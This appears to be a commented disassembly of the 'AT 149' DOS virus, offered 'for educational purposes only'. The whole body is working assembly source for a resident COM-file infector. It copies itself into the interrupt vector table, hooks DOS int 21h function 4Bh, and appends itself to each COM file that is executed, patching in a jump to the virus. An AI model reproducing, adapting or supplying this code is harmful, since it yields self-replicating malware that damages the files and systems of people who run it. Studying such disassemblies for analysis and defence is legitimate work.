

;This is a disassembly of the AT 149 virus.  It is processor specific
;and will only run on AT-class machines (286+).  It copies itself
;onto the interrupt table and hooks int 21h, function 4bh, infecting
;each COM file executed.

;Please - Do NOT release this or any other virus.  
;For educational purposes ONLY!  I take no responsibility for damages caused
;by the misuse of this or any other disassembly - they are made to help
;educate programmers as to the workings of the individual viruses and 
;viruses as a whole.  Such information MUST remain free and uncensored.

;Disassembly by Black Wolf

.model tiny
.286
.code
	org 100h
start:
		db      0e9h,02,0               ;Jump Virus_Entry

Host_File:
		int     21h                     ;Terminate

Virus_Entry:
		pusha
		mov     di,si
		call    Get_Displacement

Get_Displacement:
		pop     si
		add     si,31h                  ;SI = Storage bytes
		movsb
		movsw

		xor     al,al
		mov     es,ax
		mov     di,240h                 ;ES:DI = int table,
		sub     si,3Ah                  ;DS:SI = virus.
		cmp     byte ptr es:[di],60h    ;Check if installed in mem.
		mov     cl,95h
		rep     movsb                   ;Copy virus into memory

		jz      Done_Install
		mov     ds,ax
		mov     si,84h
		movsw
		movsw
		mov     word ptr [si-4],27Ah    ;Hook Int 21h
		mov     [si-2],ax
		push    cs
		pop     ds

Done_Install:
		push    cs
		pop     es
		popa
		jmp     si                      ;Jump back to host.

Jump_Bytes:
		db      0e9h
Storage_Bytes:
		mov     ax,4c00h

Int_21_Handler:
		pusha
		push    ds
		xor     ah,4Bh                  ;Load and Execute?
		jnz     Exit_Handler
		mov     ax,3D02h
		int     21h                     ;Open file Read/Write

		jc      Exit_Handler
		mov     bx,ax
		push    cs
		pop     ds
		mov     ah,3Fh
		mov     cx,3
		mov     dx,277h
		mov     si,dx
		int     21h                     ;Load in first 3 bytes of file

		cmp     byte ptr [si],4Dh
		je      Close_File                   ;Is it an EXE file?
		mov     ax,4202h
		xor     cx,cx
		xor     dx,dx
		int     21h                     ;Go to the end of the file

		sub     al,3                    ;If the 2nd and 3rd bytes of
		mov     bp,ax                   ;the file correspond to what
		mov     cl,95h                  ;a jump WOULD be if the virus
		sub     ax,cx                   ;were already there, exit.
		cmp     ax,[si+1]               ;(Quit if infected)

		je      Close_File
		lea     dx,[si-37h]
		mov     ah,dl
		int     21h                     ;Append Virus

		mov     ax,4200h
		xor     cx,cx
		xor     dx,dx
		int     21h                     ;Go back to the beginning.

		mov     ah,40h
		lea     dx,[si-1]
		mov     cl,3
		mov     [si],bp
		int     21h                     ;Write Jump to virus

Close_File:
		mov     ah,3Eh
		int     21h                     ;Close host file.

Exit_Handler:
		pop     ds
		popa
		db      0EAh                    ;Far Jump to old int 21h.

end     start

